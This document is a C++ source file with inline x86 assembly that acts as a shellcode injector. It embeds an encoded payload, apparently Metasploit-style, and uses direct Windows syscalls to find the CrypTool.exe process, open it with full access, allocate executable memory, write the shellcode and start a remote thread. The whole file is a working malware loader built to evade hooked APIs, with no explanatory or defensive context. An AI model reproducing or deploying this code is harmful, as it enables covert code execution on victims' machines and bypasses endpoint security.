

#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <string>


using namespace std;


int main()
{


unsigned char met[] = "\x90\x90\x90\x90\x90\xd9\xf6\xd9\x74\x24\xf4\xbf\x99\xbd\xd9\xd1\x58\x2b\xc9\xb1"
"\x59\x83\xc0\x04\x31\x78\x15\x03\x78\x15\x7b\x48\x25\x39\xf4"
"\xb3\xd6\xba\x6a\x85\x04\xde\xe1\xb7\x98\x94\xa7\x3b\x50\x4f"
"\xcc\x16\x76\x9f\x65\xdc\x50\x14\xfb\xc9\xad\xd5\xca\xc9\x62"
"\x15\x4d\xb6\x78\x4a\xad\x87\xb2\x9f\xac\xc0\x04\xd5\x41\x9c"
"\x1d\x47\x8d\x76\xa9\x2a\x91\x79\x7d\x21\xa9\x01\xf8\xf6\x5d"
"\xbe\x03\x27\x16\x76\x1c\x4c\x70\xa7\x1d\x81\xd0\x22\xd4\x51"
"\xec\x65\x6c\xad\x87\x47\x8d\xcf\x41\x96\xb1\x11\xa2\xd4\x9d"
"\x93\xfb\xdf\x3d\xe6\xf7\x23\xc3\xf1\xcc\x5e\x1f\x77\xd2\xf9"
"\xd4\x2f\x36\xfb\x39\xa9\xbd\xf7\xf6\xbd\x99\x1b\x08\x11\x92"
"\x20\x81\x94\x74\xa1\xd1\xb2\x50\xe9\x82\xdb\xc1\x57\x64\xe3"
"\x11\x3f\xd9\x41\x5a\xd2\x0c\xf5\xa3\x2c\x31\xab\x33\xe0\xfc"
"\x54\xc3\x6e\x76\x26\xf1\x31\x2c\xa0\xb9\xba\xea\x37\xc8\xad"
"\x0c\xe7\x72\xbd\xf2\x08\x82\x97\x30\x5c\xd2\x8f\x91\xdd\xb9"
"\x4f\x1d\x08\x57\x5a\x89\x73\x0f\x5a\xc8\x1c\x4d\x5b\xdb\x80"
"\xd8\xbd\x8b\x68\x8a\x11\x6c\xd9\x6a\xc2\x04\x33\x65\x3d\x34"
"\x3c\xac\x56\xdf\xd3\x18\x0e\x48\x4d\x01\xc4\xe9\x92\x9c\xa0"
"\x2a\x18\x14\x54\xe4\xe9\x5d\x46\x11\x8e\x9d\x96\xe2\x3b\x9d"
"\xfc\xe6\xed\xca\x68\xe5\xc8\x3c\x37\x16\x3f\x3f\x30\xe8\xbe"
"\x09\x4a\xdf\x54\x35\x24\x20\xb9\xb5\xb4\x76\xd3\xb5\xdc\x2e"
"\x87\xe6\xf9\x30\x12\x9b\x51\xa5\x9d\xcd\x06\x6e\xf6\xf3\x71"
"\x58\x59\x0c\x54\xda\x9e\xf2\x2a\xf5\x06\x9a\xd4\x45\xb7\x5a"
"\xbf\x45\xe7\x32\x34\x69\x08\xf2\xb5\xa0\x41\x9a\x3c\x25\x23"
"\x3b\x40\x6c\xe5\xe5\x41\x83\x3e\x16\x3b\xec\xc1\xd7\xbc\xe4"
"\xa5\xd8\xbc\x08\xd8\xe5\x6a\x31\xae\x28\xaf\x06\xa1\x1f\x92"
"\x2f\x28\x5f\x80\x30\x79\x90\x90\x90\x90";

void* mem = malloc(sizeof(char) * sizeof(met));
memcpy(mem, met, sizeof(met));
int payloadLen = sizeof(met);
	
__asm {
	
	jmp Begin
	Invoke:
	call dword ptr fs:[0xc0]
	ret


	Begin:

		sub esp, 0x3e8
		xor eax, eax
		mov dword ptr[ebp - 0x18], eax //dwSize
		mov dword ptr[ebp - 0x4], eax			//allocated address

	
	StartLoop:
		mov eax, 1 // while (TRUE)
		test eax, eax
		je LoopDone

		

	ntallocate1:
		push 0x4							//Protect
		xor ebx, ebx 
		mov bh, 0x30
		push ebx
		lea ebx, dword ptr[ebp - 0x18]		//RegionSize
		push ebx
		xor ecx, ecx 
		push ecx                           //ZeroBits
		lea ebx, dword ptr[ebp - 0x4]		//BaseAddress
		push ebx
		push -1 							// Process handle from NtOpenProcess
		mov eax, 0x18
		call Invoke

		test eax, eax
		je getSize
		cmp eax, 0xc000000d
		jne nextInstr
		xor eax, eax
		
		
		getSize:
			mov eax, dword ptr[ebp-0x4]
		
		nextInstr:

		NtQuerySystemInformation :
			mov dword ptr[ebp - 0x30], eax // save ntalloc returned value
			lea eax, dword ptr[ebp - 0xc] // &dwRet
			push eax
			mov ecx, dword ptr[ebp - 0x18] //dwSize
			push ecx
			mov edx, dword ptr[ebp - 0x30] // ntalloc Value
			push edx
			push 5
			mov eax, 0x36
			call Invoke
			
			mov dword ptr[ebp - 0x24], eax // return value from NtQuerySystemInformation
			cmp dword ptr[ebp - 0x24], 0
			je LoopDone
			mov eax, dword ptr[ebp - 0xC]
			add eax, 0x2000
			mov dword ptr[ebp - 0x18], eax
			jmp StartLoop




	LoopDone:
	
		push 0x00650078 //CrypTool.exe
		push 0x0065002e
		push 0x006c006f
		push 0x006f0054
		push 0x00700079
		push 0x00720043
		mov dword ptr [ebp-0x24], esp //CrypTool.exe
	
		
	enumerateProcesses:
		mov eax, dword ptr[ebp-0x30] //all processes
		cmp eax, 0
		je finishedProcesses

		mov ebx, dword ptr[ebp - 0x30]
		mov edx, dword ptr[ebx+0x3c] //Image buffer
		cmp edx, 0
		je nextProc
		mov esi, edx // Destination
		mov edi, dword ptr[ebp-0x24] // Source
		mov ecx, 24
		cld 
		repe  cmpsb
		jecxz  match
		nextProc:
		add eax, dword ptr[eax]
		mov dword ptr[ebp-0x30], eax
		jmp enumerateProcesses

	finishedProcesses:



	match:
	
		mov eax, dword ptr[ebx+0x44] //pid
		mov dword ptr[ebp-0x34], eax
	
	

	openprocess:
		mov dword ptr[ebp - 4], 0x0
		mov dword ptr[ebp - 8], 0x0
		lea eax, dword ptr[ebp - 8]	//unicode_string

		mov ebx, dword ptr[ebp-0x34] //pid from ntquery
		mov dword ptr[ebp - 0x10], ebx	//pid
		mov dword ptr[ebp - 0xC], 0x0
		lea ebx, dword ptr[ebp - 0x10]		//client_id


		mov dword ptr[ebp - 0x28], 0x18		//Length
		mov dword ptr[ebp - 0x24], 0x0		//Root
		mov dword ptr[ebp - 0x20], 0x0		//ObjectName
		mov dword ptr[ebp - 0x1c], 0x0		//Attributes
		mov dword ptr[ebp - 0x18], 0x0		//SecurityDesc
		mov dword ptr[ebp - 0x14], 0x0		//SecurityQuality
		lea ecx, dword ptr[ebp - 0x28]		//object_attributes


		mov dword ptr[ebp - 0x2C], 0 			//buffer for process handle


		push ebx	// ClientId
		push ecx	//ObjectAttributes
		push 0x1FFFFF // DesiredAccess
		lea ebx, dword ptr[ebp - 0x2c] // Process handle
		push ebx		// dummy process handle


		mov eax, 0x26						// syscall number for NtOpenProcess 
		call Invoke
	

	ntallocate :
		
		mov ebx, payloadLen				// Size to allocate
		mov dword ptr[ebp - 0x8], ebx	//size to allocate
		mov dword ptr[ebp - 0x4], 0			//allocated address
		push 0x40
		push 0x3000
		lea ebx, dword ptr[ebp - 0x8]
		push ebx
		push 0
		lea ebx, dword ptr[ebp - 0x4]
		push ebx
		push dword ptr[ebp-0x2c] // Process handle from NtOpenProcess

		mov eax, 0x18
		call Invoke

		mov eax, dword ptr[ebp - 4]		//save allocated address in remote process
		mov dword ptr[ebp - 0x20], eax // ---> saved allocated address from ntallocate


		ntwrite :

			lea eax, dword ptr[ebp-0x8] // bytes written
			push eax
			push payloadLen	//size of shellcode
			push mem //shellcode pointer
			
			push dword ptr[ebp-0x20] // pointer to buffer
			push dword ptr[ebp - 0x2C] // handle

			mov eax, 0x3A
			
			call Invoke
			

		ntcreateThread:

			xor ecx, ecx
			

			push ecx
			push ecx
			push ecx
			push ecx
			push ecx
			push ecx
			push dword ptr[ebp-0x20]	//pointer to buffer
			push dword ptr[ebp - 0x2c]	// process handle
			
			push ecx
			push 0x1fffff				//THREAD_ALL_ACCESS
			mov dword ptr [ebp-4], ecx
			lea ebx, dword ptr[ebp-4]
			push ebx					// &threadHandle

			mov eax, 0xc1
			call Invoke
			

		waitforsingleobject:
			push 0
			push 1
			push dword ptr[ebp-4]
			mov eax, 0xd0004
			call Invoke
				
				
	}

	
	return 0;




}

	

